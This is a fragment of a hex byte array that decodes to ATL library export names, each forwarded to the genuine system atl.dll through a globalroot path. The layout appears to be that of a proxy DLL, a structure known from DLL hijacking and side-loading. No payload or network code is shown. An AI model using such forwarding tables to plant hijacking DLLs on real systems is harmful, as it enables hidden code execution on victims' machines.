	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x47, 0x65,
	0x74, 0x48, 0x6F, 0x73, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x57, 0x69, 0x6E, 0x49, 0x6E,
	0x69, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x41, 0x78, 0x57,
	0x69, 0x6E, 0x49, 0x6E, 0x69, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x50, 0x74, 0x72,
	0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x43, 0x6F, 0x6D, 0x50, 0x74, 0x72, 0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00, 0x41, 0x74,
	0x6C, 0x43, 0x6F, 0x6D, 0x51, 0x49, 0x50, 0x74, 0x72, 0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x51, 0x49, 0x50,
	0x74, 0x72, 0x41, 0x73, 0x73, 0x69, 0x67, 0x6E, 0x00, 0x41, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61,
	0x74, 0x65, 0x54, 0x61, 0x72, 0x67, 0x65, 0x74, 0x44, 0x43, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74,
	0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x61, 0x72, 0x67, 0x65,
	0x74, 0x44, 0x43, 0x00, 0x41, 0x74, 0x6C, 0x44, 0x65, 0x76, 0x4D, 0x6F, 0x64, 0x65, 0x57, 0x32,
	0x41, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x44, 0x65, 0x76, 0x4D,
	0x6F, 0x64, 0x65, 0x57, 0x32, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x61,
	0x72, 0x73, 0x68, 0x61, 0x6C, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61,
	0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x61, 0x72, 0x73, 0x68, 0x61,
	0x6C, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x00, 0x41, 0x74, 0x6C, 0x47, 0x65, 0x74, 0x4F, 0x62,
	0x6A, 0x65, 0x63, 0x74, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66,
	0x61, 0x63, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x47, 0x65,
	0x74, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x49, 0x6E, 0x74,
	0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x47, 0x65, 0x74, 0x56, 0x65, 0x72,
	0x73, 0x69, 0x6F, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x47,
	0x65, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00, 0x41, 0x74, 0x6C, 0x48, 0x69, 0x4D,
	0x65, 0x74, 0x72, 0x69, 0x63, 0x54, 0x6F, 0x50, 0x69, 0x78, 0x65, 0x6C, 0x00, 0x5C, 0x5C, 0x3F,
	0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C,
	0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x48, 0x69, 0x4D, 0x65, 0x74, 0x72, 0x69, 0x63, 0x54,
	0x6F, 0x50, 0x69, 0x78, 0x65, 0x6C, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69,
	0x73, 0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67, 0x5F, 0x4C, 0x6F,
	0x61, 0x64, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65,
	0x72, 0x73, 0x69, 0x73, 0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67,
	0x5F, 0x4C, 0x6F, 0x61, 0x64, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73,
	0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67, 0x5F, 0x53, 0x61, 0x76,
	0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72,
	0x73, 0x69, 0x73, 0x74, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x42, 0x61, 0x67, 0x5F,
	0x53, 0x61, 0x76, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74,
	0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E, 0x69, 0x74, 0x5F, 0x47, 0x65, 0x74, 0x53, 0x69,
	0x7A, 0x65, 0x4D, 0x61, 0x78, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E,
	0x69, 0x74, 0x5F, 0x47, 0x65, 0x74, 0x53, 0x69, 0x7A, 0x65, 0x4D, 0x61, 0x78, 0x00, 0x41, 0x74,
	0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49,
	0x6E, 0x69, 0x74, 0x5F, 0x4C, 0x6F, 0x61, 0x64, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61,
	0x6D, 0x49, 0x6E, 0x69, 0x74, 0x5F, 0x4C, 0x6F, 0x61, 0x64, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x50,
	0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E, 0x69, 0x74,
	0x5F, 0x53, 0x61, 0x76, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x49, 0x50, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x49, 0x6E,
	0x69, 0x74, 0x5F, 0x53, 0x61, 0x76, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x49, 0x6E, 0x74, 0x65, 0x72,
	0x6E, 0x61, 0x6C, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66, 0x61, 0x63,
	0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x49, 0x6E, 0x74, 0x65,
	0x72, 0x6E, 0x61, 0x6C, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x66, 0x61,
	0x63, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x61, 0x72, 0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72,
	0x49, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x4D, 0x61, 0x72, 0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72, 0x49, 0x6E, 0x50, 0x72, 0x6F,
	0x63, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x41, 0x64, 0x64, 0x43, 0x72,
	0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61,
	0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x41, 0x64, 0x64, 0x43,
	0x72, 0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61, 0x00, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x41, 0x64, 0x64, 0x54, 0x65, 0x72, 0x6D, 0x46, 0x75, 0x6E,
	0x63, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x41, 0x64, 0x64, 0x54, 0x65, 0x72, 0x6D, 0x46, 0x75, 0x6E, 0x63, 0x00, 0x41, 0x74,
	0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x45, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x43, 0x72,
	0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61,
	0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x45, 0x78, 0x74, 0x72,
	0x61, 0x63, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x57, 0x6E, 0x64, 0x44, 0x61, 0x74, 0x61,
	0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x47, 0x65, 0x74, 0x43, 0x6C, 0x61,
	0x73, 0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x47, 0x65, 0x74, 0x43, 0x6C, 0x61, 0x73,
	0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C,
	0x65, 0x49, 0x6E, 0x69, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F,
	0x64, 0x75, 0x6C, 0x65, 0x4C, 0x6F, 0x61, 0x64, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65,
	0x4C, 0x6F, 0x61, 0x64, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x41, 0x74, 0x6C, 0x4D,
	0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x43, 0x6C, 0x61,
	0x73, 0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C,
	0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74,
	0x65, 0x72, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x00, 0x41,
	0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
	0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53,
	0x65, 0x72, 0x76, 0x65, 0x72, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52,
	0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52,
	0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x41,
	0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
	0x57, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x49, 0x6E, 0x66, 0x6F, 0x41, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65,
	0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x57, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x49, 0x6E,
	0x66, 0x6F, 0x41, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x67,
	0x69, 0x73, 0x74, 0x65, 0x72, 0x57, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x49, 0x6E, 0x66,
	0x6F, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64,
	0x75, 0x6C, 0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x57, 0x6E, 0x64, 0x43, 0x6C,
	0x61, 0x73, 0x73, 0x49, 0x6E, 0x66, 0x6F, 0x57, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x52, 0x65, 0x76, 0x6F, 0x6B, 0x65, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x4F, 0x62, 0x6A,
	0x65, 0x63, 0x74, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D,
	0x6F, 0x64, 0x75, 0x6C, 0x65, 0x52, 0x65, 0x76, 0x6F, 0x6B, 0x65, 0x43, 0x6C, 0x61, 0x73, 0x73,
	0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x73, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C,
	0x65, 0x54, 0x65, 0x72, 0x6D, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x54, 0x65, 0x72, 0x6D, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F,
	0x64, 0x75, 0x6C, 0x65, 0x55, 0x6E, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x54, 0x79,
	0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x6E, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
	0x54, 0x79, 0x70, 0x65, 0x4C, 0x69, 0x62, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C,
	0x65, 0x55, 0x6E, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x65,
	0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x55, 0x6E, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76,
	0x65, 0x72, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x6E, 0x72, 0x65,
	0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x45, 0x78, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55,
